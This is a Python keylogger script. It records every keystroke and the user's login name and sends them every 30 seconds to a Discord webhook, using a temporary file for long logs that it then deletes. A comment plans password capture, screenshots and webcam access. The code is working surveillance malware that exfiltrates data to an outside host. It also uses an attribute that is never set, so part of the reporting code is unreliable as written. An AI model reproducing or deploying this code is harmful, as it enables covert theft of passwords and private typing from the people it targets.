import os
from datetime import datetime
from threading import Timer
from discord_webhook import DiscordWebhook, DiscordEmbed
import keyboard

SEND_REPORT_EVERY = 30
WEBHOOK = "{webhook_url}" #ADD PASSWORD DETECTION, SCREENSHOT AND WEB CAM 

class Keylogger:
    def __init__(self, interval, report_method="webhook"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now().strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000:
            flag = True
            path = os.path.join(os.environ["temp"], "report.txt")
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now().strftime('%d/%m/%Y %H:%M')
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")
    keylogger.start()